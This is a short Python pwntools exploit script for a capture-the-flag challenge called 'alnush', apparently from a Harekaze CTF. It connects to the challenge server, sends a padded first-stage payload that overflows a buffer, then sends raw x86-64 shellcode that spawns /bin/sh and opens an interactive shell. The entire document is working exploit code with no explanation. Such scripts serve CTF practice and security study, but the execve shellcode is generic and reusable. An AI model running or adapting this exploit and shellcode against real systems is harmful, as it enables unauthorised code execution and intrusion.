from pwn import *

elf=ELF("./alnush")

#p=process("./alnush", aslr=False)
p=remote("problem.harekaze.com", 20003)

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode2="q0".ljust(0x27,"P")

print p.recv()
p.send(shellcode2.ljust(0x208,"\x00")+"\x01")
time.sleep(1)
p.sendline(shellcode)


p.interactive()


